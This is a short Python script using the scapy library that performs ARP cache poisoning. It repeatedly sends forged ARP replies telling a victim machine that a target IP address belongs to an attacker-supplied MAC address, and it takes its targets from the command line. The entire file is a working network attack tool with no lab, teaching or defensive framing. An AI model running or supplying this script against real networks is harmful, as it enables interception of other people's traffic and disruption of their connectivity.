from scapy.all import ARP, send
import sys

def arp_poison(victim_ip, target_ip, fake_mac):
    arp_packet = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=fake_mac)
    
    print(f"[INFO] Injecting fake ARP entry: {target_ip} -> {fake_mac} into {victim_ip}'s ARP table.")
    try:
        while True:
            send(arp_packet, verbose=False)
    except KeyboardInterrupt:
        print("\n[INFO] ARP Poisoning stopped.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python arp_poisoning.py <victim_ip> <target_ip> <fake_mac>")
        sys.exit(1)
    
    victim_ip = sys.argv[1]
    target_ip = sys.argv[2]
    fake_mac = sys.argv[3]
    arp_poison(victim_ip, target_ip, fake_mac)
